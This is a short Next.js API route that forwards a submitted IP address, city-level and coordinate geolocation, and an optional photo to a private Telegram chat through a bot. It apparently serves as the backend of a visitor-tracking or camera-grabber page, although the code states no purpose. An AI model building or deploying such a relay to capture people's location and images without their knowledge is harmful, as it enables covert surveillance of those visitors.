import { NextResponse } from 'next/server';
import axios from 'axios';

export async function POST(request) {
  try {
    const { ip, location, photo } = await request.json();

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    const message = `
    New Submission:
    IP: ${ip}
    Country: ${location.country}
    City: ${location.city}
    Latitude: ${location.latitude}
    Longitude: ${location.longitude}
    `;

    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: message,
    });

    if (photo) {
      await axios.post(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        chat_id: chatId,
        photo: photo,
      });
    }

    return NextResponse.json({ success: true });
  } catch (error) {
    return NextResponse.json({ error: 'Failed to send to Telegram' }, { status: 500 });
  }
}
